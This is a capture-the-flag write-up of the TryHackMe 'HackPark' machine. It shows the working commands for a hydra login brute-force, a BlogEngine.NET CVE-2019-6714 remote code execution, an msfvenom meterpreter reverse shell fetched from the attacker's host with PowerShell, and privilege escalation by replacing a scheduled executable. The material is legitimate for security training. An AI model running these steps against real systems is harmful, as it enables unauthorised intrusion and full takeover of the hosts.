# what I learned
- WindowsScheduler

# enumerate
port scanning...
- 80/tcp   open  http
  - /Account/login.aspx?ReturnURL=/admin/ 
    - Login failed
- 3389/tcp open  ms-wbt-server

# foothold
run brup suite and intercept the cookie in Params: Replace username with ^USER^, password with ^PASS^ and adding error message when login with wrong credential in the end (`:Login failed`)
```console
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=ReUZyiBNjEGKeMibgp4kMp%2BpV8%2FBXT6KJ5yVTiiloqnNrhPnc5%2BMOi0Mhsg8Zuh91AzFdRDfMeq3wDBXOwMOOJZn7Z89Upu2X7b2JfzpJaJgoK%2BHtu0boZwpcK12443Yf5TrM0Zajc1jhbNFRz9ICeBgFtDMzoezB2aXk7IxB%2B0N%2ByTU9Ow1NQ92IUomSFDMm0Xeu9ZTn94jm4%2FRCugqfdfoSq68g0Qg4DMkcnjuZptE%2F3w8MRK8dhh2xfdUTP%2B%2Fo%2FDuQBdvxBuZF15fxPjk2P2SUWYa76pvrRUE9O5VwqrzZnbYhAjTNy2u71XUY6%2FQ1MQhbFO4XdJU1IqK6a2wUlpO5WpNEXM00JQb3iX5HjVuojvy&__EVENTVALIDATION=XZyseVXU202%2BVJwJvA0EQjrNegLpyhRhzoG95ql%2B0xX0Mt%2FRMdQpXHsTMzNRQxFJ1S6cPiKD6o5QjkQjbchWL3z%2BYkwDDyYq5IBfX2mdIwCBodVAKsQQy8R%2FBGZlZjjQ0lVK7hRx2dCQCNCfdQQ7vNjgHgPpxOiFkhRV%2BuvEKSQrClSL&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'
```
1qaz2wsx

in `/admin/about.cshtml` you will find more infomation about the service, BlogEngine.NET version  3.3.6.0. after some digging, I found:
```
CVE-2019-6714
*
* Path traversal vulnerability leading to remote code execution.  This 
* vulnerability affects BlogEngine.NET versions 3.3.6 and below.  This 
* is caused by an unchecked "theme" parameter that is used to override
* the default theme for rendering blog pages.  The vulnerable code can 
* be seen in this file:
```
the exploit script tell us exackly what we should do
1. download the script and rename it as `PostView.ascx`
2. put load the script at `/admin/app/editor/editpost.cshtml`
3. execute the reverse shell `/?theme=../../App_Data/files`

current reverse shell is not so good, the plan is get **meterpreter** shell: let start by create the meterpreter shell using `msfvenom`:
```console
kali@kali:~/THM/hackpark$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.14.151 LPORT=9696 -f exe -o shell2.exe
```
now in the restricted shell, move to any folder that you will have permission to download/save the our reverse shell (in my case, `c:\Users\Public\Documents`)

```console
cd c:\Users\Public\Documents
c:\windows\system32\inetsrv>cd c:\Users\Public\Documents
dir
c:\Users\Public\Documents>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Users\Public\Documents
07/23/2020  08:16 AM    <DIR>          .
07/23/2020  08:16 AM    <DIR>          ..
07/23/2020  08:16 AM    <DIR>          Microsoft
               0 File(s)              0 bytes
               3 Dir(s)  38,400,802,816 bytes free
powershell -command "IEX (New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell2.exe','shell2.exe')" # download reverse shell from our kali
c:\Users\Public\Documents>powershell -command "IEX (New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell2.exe','shell2.exe')"
dir
c:\Users\Public\Documents>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Users\Public\Documents
07/23/2020  08:17 AM    <DIR>          .
07/23/2020  08:17 AM    <DIR>          ..
07/23/2020  08:16 AM    <DIR>          Microsoft
07/23/2020  08:17 AM             7,168 shell2.exe
               1 File(s)          7,168 bytes
               3 Dir(s)  38,400,782,336 bytes free
```
now run msfconsole and using `exploit/multi/handler` to wait for reverse shell
```console
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/handler) > set LPORT 9696
LPORT => 9696
msf5 exploit(multi/handler) > run
```
back to our shell, execute our meterpreter reverse shell .exe
```
shell2.exe
c:\Users\Public\Documents>shell2.exe
```
# User + Rooted
We cannot do anything with our privilage: not that there are a user call Jeff on the server. Let using winPEAS to find out more about the server.
```
meterpreter > upload winPEAS-x86.exe
meterpreter > winPEAS-x86.exe
.
.
WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running                                                                    
File Permissions: Everyone [WriteData/CreateFiles]
Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])                                                                                  
System Scheduler Service Wrapper
.
.
```
WindowsScheduler is like crontab in Linux. not that can write/create a file on that folder, let find out more about processes so we can use it to escalate to root user.
```console
meterpreter > pwd
c:\Program Files (x86)\SystemScheduler\Events 
meterpreter > ls
Listing: c:\Program Files (x86)\SystemScheduler\Events
======================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  1927   fil   2019-08-04 18:05:19 -0400  20198415519.INI
100666/rw-rw-rw-  16286  fil   2019-08-04 18:06:01 -0400  20198415519.INI_LOG.txt
100666/rw-rw-rw-  186    fil   2020-07-23 11:38:28 -0400  Administrator.flg
100666/rw-rw-rw-  182    fil   2020-07-23 11:38:01 -0400  SYSTEM_svc.flg
100666/rw-rw-rw-  0      fil   2020-07-23 11:38:28 -0400  Scheduler.flg
100666/rw-rw-rw-  449    fil   2019-08-04 07:36:53 -0400  SessionInfo.flg
100666/rw-rw-rw-  0      fil   2020-07-23 11:38:01 -0400  service.flg
meterpreter > cat 20198415519.INI_LOG.txt # log
Listing: c:\Program Files (x86)\SystemScheduler\Events
07/23/20 09:14:02,Event Started Ok, (Administrator)
07/23/20 09:14:33,Process Ended. PID:648,ExitCode:4,Message.exe (Administrator)
07/23/20 09:15:03,Event Started Ok, (Administrator)
07/23/20 09:15:34,Process Ended. PID:2264,ExitCode:4,Message.exe (Administrator)
07/23/20 09:16:02,Event Started Ok, (Administrator)
07/23/20 09:16:33,Process Ended. PID:2488,ExitCode:4,Message.exe (Administrator)
07/23/20 09:17:02,Event Started Ok, (Administrator)
07/23/20 09:17:33,Process Ended. PID:1916,ExitCode:4,Message.exe (Administrator)
07/23/20 09:18:02,Event Started Ok, (Administrator)
07/23/20 09:18:33,Process Ended. PID:1248,ExitCode:4,Message.exe (Administrator)
07/23/20 09:19:03,Event Started Ok, (Administrator)
07/23/20 09:19:34,Process Ended. PID:1300,ExitCode:4,Message.exe (Administrator)
07/23/20 09:20:02,Event Started Ok, (Administrator)
07/23/20 09:20:33,Process Ended. PID:2460,ExitCode:4,Message.exe (Administrator)
```
Seem like there is a schedule for a file call `Message.exe` which is executed each 30 sec and so. The plan is we will replace `Message.exe` with a meterpreter shell. The reverse shell will be executed as Root and then bingo, we will get reverse shell with root privilage:
```console
meterpreter > upload /home/kali/THM/hackpark/shell2.exe # upload our shell in the server at c:\Program Files (x86)\SystemScheduler\Events
[*] uploading  : /home/kali/THM/hackpark/shell2.exe -> shell2.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/THM/hackpark/shell2.exe -> shell2.exe
[*] uploaded   : /home/kali/THM/hackpark/shell2.exe -> shell2.exe
meterpreter > mv Message.exe Message.bak # change it .bak
meterpreter > mv shell2.exe Message.exe # change to Message.exe
meterpreter > background # background the session.
```
now let run another meterpreter session
```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.14.151:9696 
[*] Sending stage (176195 bytes) to 10.10.139.25
[*] Meterpreter session 7 opened (10.8.14.151:9696 -> 10.10.139.25:49498) at 2020-07-23 12:28:01 -0400
meterpreter > shell
C:\PROGRA~2\SYSTEM~1>echo %username%
echo %username%
Administrator
```
